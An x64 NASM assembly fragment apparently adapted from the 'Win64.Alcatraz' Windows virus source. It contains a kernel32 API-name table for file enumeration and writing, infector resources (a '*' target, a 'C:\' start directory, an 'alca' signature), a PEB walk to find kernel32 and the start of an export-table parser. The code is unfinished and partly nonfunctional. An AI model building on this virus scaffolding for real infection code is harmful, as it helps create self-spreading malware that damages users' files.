; https://github.com/lem0nSec/Alcatraz/blob/c8f70dd45fd32f4faf0f961f04d1ec9cc2f06293/src/Win64.Alcatraz.asm#L79
;RCX、RDX、R8 和 R9 
[BITS 64]
section .text


global EntryPointLoad
extern printf
extern GetProcAddress 
extern GetModuleHandleA
EntryPointLoad:
	push        rdi
    push        rsi
    push        rbp
    push        rbx
    ; Alloc space on the stack for the function pointers and the kernel base
    sub         rsp, 0x200
	
    ; mov         rbp, rsp

	call _getKernel32AddressTable
	add rsp, 0x200
	pop         rbx
    pop         rbp
    pop         rsi
    pop         rdi

    ret
	
_kernel32AddressTable:

	k32LocalAlloc		db	"LocalAlloc", 0			; + 0
	
	k32LocalFree		db	"LocalFree", 0			; + 8

	k32ExitProcess		db	"ExitProcess", 0		; + 16

	k32CreateFileA		db	"CreateFileA", 0		; + 24

	k32GetFileSize		db	"GetFileSize", 0		; + 32

	k32ReadFile		db	"ReadFile", 0			; + 40

	k32WriteFile		db	"WriteFile", 0			; + 48

	k32CloseHandle		db	"CloseHandle", 0		; + 56

	k32FindFirstFileA	db	"FindFirstFileA", 0		; + 64

	k32FindNextFileA	db	"FindNextFileA", 0		; + 72

	k32SetCurrentDirectoryA	db	"SetCurrentDirectoryA", 0	; + 80

	k32GetCurrentDirectory	db	"GetCurrentDirectoryA", 0	; + 88

	k32GetModuleHandleA	db	"GetModuleHandleA", 0		; + 96
	kernel_name  db "Kernel32.dll",0
	error_str db "execute error", 0


_resources:

	name			db	".text", 0

	target			db	"*", 0

	dir			db	"C:\", 0

	dotdot			db	"..", 0

	signature		db	"alca", 0


_getKernel32AddressTable:
	push        rdi
    push        rsi
    push        rbp
    push        rbx

	
	
 	lea rcx, [rel kernel_name]
	call GetModuleHandleA

	mov rcx,rax
	lea rdx, [rel k32LocalAlloc]
	call GetProcAddress

 test rax, rax
    jz _returnError

	pop         rbx
    pop         rbp
    pop         rsi
    pop         rdi
    ret


_get_Kernel32_Handle:
	mov 	rax, QWORD [gs:0x60]			; TEB address
	mov 	rax, [rax + 18h]			; Ldr address
	mov 	rax, [rax + 20h]			; InMemoryOrderModuleList address
	mov 	rax, [rax]				; skip current module
	mov 	rax, [rax]				; skip ntdll.dll (ntdll.dll always at the second position)
	mov 	rax, [rax + 20h]			; kernel32.dll base address
	ret

_get_function_export:
	
	test 	rcx, rcx
	jz 		_returnError			; rcx contains kernel32.dll base address

	mov 	eax, [rcx + 3Ch]			; IMAGE_DOS_HEADER -> e_lfanew
	add 	rax, rcx				; IMAGE_NT_HEADER
	lea 	rax, [rax + 18h]			; IMAGE_OPTIONAL_HEADER
	lea 	rax, [rax + 70h]			; IMAGE_DATA_DIRECTORY
	lea 	rax, [rax + 0h]				; IMAGE_DATA_DIRECTORY[IMAGE_DATA_EXPORT_DIRECTORY]

	mov 	edx, [rax]
	lea 	rax, [rdx + rcx]			; base of IMAGE_DATA_EXPORT_DIRECTORY

	mov 	edx, [rax + 18h]			; NumberOfNames
	mov 	r8d, [rax + 20h]			; AddressOfNames
	lea 	r8, [rcx + r8]

	mov 	r10, 41636f7250746547h
	mov 	r11, 0073736572646441h

_returnError:
	lea rcx ,[rel error_str]
	call printf
	xor 	rax, rax 
	ret